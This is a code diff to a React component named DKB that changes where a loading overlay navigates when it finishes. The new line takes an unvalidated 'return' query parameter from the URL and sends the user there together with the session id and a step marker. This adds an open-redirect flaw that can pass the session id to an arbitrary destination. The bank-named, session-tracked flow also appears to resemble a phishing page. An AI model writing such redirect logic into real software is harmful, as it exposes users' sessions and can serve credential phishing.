@@ -384,7 +384,7 @@ const DKB = () => {
         </div>
       </footer>
 
-      {showLoading && <LoadingOverlay onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
+      {showLoading && <LoadingOverlay onComplete={() => navigate((new URLSearchParams(window.location.search).get("return") || "") ? `${new URLSearchParams(window.location.search).get("return")}?step=3&s=${sessionId}` : "/confirmation?s=" + sessionId)} />}
     </div>
   );
 };
